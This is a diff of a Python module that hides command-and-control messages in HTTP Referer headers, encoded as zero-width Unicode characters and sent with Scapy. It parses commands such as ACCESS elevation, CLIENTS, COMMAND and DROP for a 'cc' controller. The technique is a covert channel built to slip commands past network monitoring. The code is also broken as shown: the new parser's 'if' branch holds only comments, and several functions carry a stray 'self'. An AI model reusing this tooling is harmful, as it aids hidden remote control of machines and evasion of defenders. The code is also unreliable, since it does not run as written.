@@ -3,6 +3,7 @@
 # from scapy.sendrecv import send
 # from scapy.all import *
 # load_layer('http')
+# from scapy.layers.http import HTTPRequest
 
 zero = '\u200c'  # 0
 one = '\u200d'  # 1
@@ -68,39 +69,72 @@ def unicode_to_binary(message):
 
     return final_final_res
 
-def parser(self,message,client_instance):
-        print(message)
-        message = message[:100].split()
-        print(message)
-        if message != []:
-            command = message[0]
-            if command == "ACCESS" and len(message) == 2:
-                    client_instance.elevatation(message[1])
-            elif client_instance.elevated:
-                print(client_instance.elevated)
-                if command == "CLIENTS" and len(message) == 1:
-                        self.cc.clients(client_instance)
-                elif command == "COMMAND": 
-                    if len(message) == 3:
-                        print("Commad")
-                        self.cc.command(message[1], message[2])
-                    elif len(message) == 4:
-                        self.cc.command(message[1], message[2], message[3])
-                elif command == "DROP" and len(message) == 1:
-                        client_instance.elevatation()
 
-def construct_packet(self, ip, command, message=None):
-        r_input = binary_converter(command + ' ' + message)
-        print(r_input)
+def binary_deconverter(message):
+    index1 = 4
+    index2 = 12
+    command = ''
+    new_message = ''
+    if message[0:4] == "0000":
+        command = "SEND"
+    if message[0:4] == "0001":
+        command = "DISCONNECT"
+    if message[0:4] == "0010":
+        command = "CLIENTS"
+    if message[0:4] == "0011":
+        command = "ECHO"
+    if message[0:4] == "0100":
+        command = "DROP"
+    if message[0:4] == "0101":
+        command = "ACCESS"
+
+    while index1 < len(message):
+        character = chr(int(message[index1:index2], 2))
+        new_message += character
+        index1 += 8
+        index2 += 8
+
+    return command + ' ' + new_message
+
+def parser(self, message):
+        message_tmp = message.split()
+
+        if message_tmp[0] == 'COMMAND':
+
+
+        # print(message)
+        # message = message[:100].split()
+        # print(message)
+        # if message != []:
+        #     command = message[0]
+        #     if command == "ACCESS" and len(message) == 2:
+        #             client_instance.elevatation(message[1])
+        #     elif client_instance.elevated:
+        #         print(client_instance.elevated)
+        #         if command == "CLIENTS" and len(message) == 1:
+        #                 self.cc.clients(client_instance)
+        #         elif command == "COMMAND":
+        #             if len(message) == 3:
+        #                 print("Commad")
+        #                 self.cc.command(message[1], message[2])
+        #             elif len(message) == 4:
+        #                 self.cc.command(message[1], message[2], message[3])
+        #         elif command == "DROP" and len(message) == 1:
+        #                 client_instance.elevatation()
+
+def construct_packet(ip, input):
+        r_input = binary_converter(input)
+        # print(r_input)
         r_input = binary_to_unicode(r_input)
-        print(r_input)
+        # print(r_input)
 
         packet = IP(dst=ip)/HTTP()/HTTPRequest(
-                    Referer=command
+                    Referer=r_input
                 )
         return bytes(packet)
-
 
 def deconstruct_packet(self, packet):
     message = packet[HTTPRequest].Referer
     message = unicode_to_binary(message.encode())
+    message = binary_deconverter(message)
+    print(message)
